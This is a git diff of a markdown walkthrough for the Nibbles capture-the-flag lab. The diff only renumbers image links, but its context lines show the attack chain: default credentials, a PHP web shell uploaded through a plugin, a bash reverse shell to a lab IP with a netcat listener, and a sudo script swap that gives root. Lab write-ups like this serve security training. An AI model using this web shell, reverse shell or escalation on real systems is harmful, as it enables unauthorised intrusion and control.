@@ -2,7 +2,7 @@
 
 ## Enumeration
 
-<figure><img src="../../.gitbook/assets/image (1329).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>
 
 * Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
 
@@ -37,9 +37,9 @@ This shows us how crucial thorough enumeration is. Let us recap what we have fou
 
 Try with defaults credentails, `admin : nibbles` and enter -->
 
-<figure><img src="../../.gitbook/assets/image (1330).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1331).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>
 
 ```
 nano ws.php
@@ -47,11 +47,11 @@ nano ws.php
 <?php system($_GET['cmd']); ?>
 ```
 
-<figure><img src="../../.gitbook/assets/image (1332).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>
 
 Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
 
-<figure><img src="../../.gitbook/assets/image (1333).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>
 
 ```
 bash -c 'bash -i >%26 /dev/tcp/10.10.15.199/1234 0>%261'
@@ -59,7 +59,7 @@ bash -c 'bash -i >%26 /dev/tcp/10.10.15.199/1234 0>%261'
 nc -lvnp 1234
 ```
 
-<figure><img src="../../.gitbook/assets/image (1334).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>
 
 * Gain a foothold on the target and submit the user.txt flag
 
@@ -102,9 +102,9 @@ Archive:  personal.zip
 
 If we do a `sudo -l` we can see it too -->
 
-<figure><img src="../../.gitbook/assets/image (1335).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1336).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>
 
 In this capture, we can see that im the propietary about monitor.sh. So, delete it and create a new with only "bash" word. With, we can execute it with sudo
 
@@ -115,4 +115,4 @@ In this capture, we can see that im the propietary about monitor.sh. So, delete 
 <strong>sudo ./monitor.sh 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1337).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>
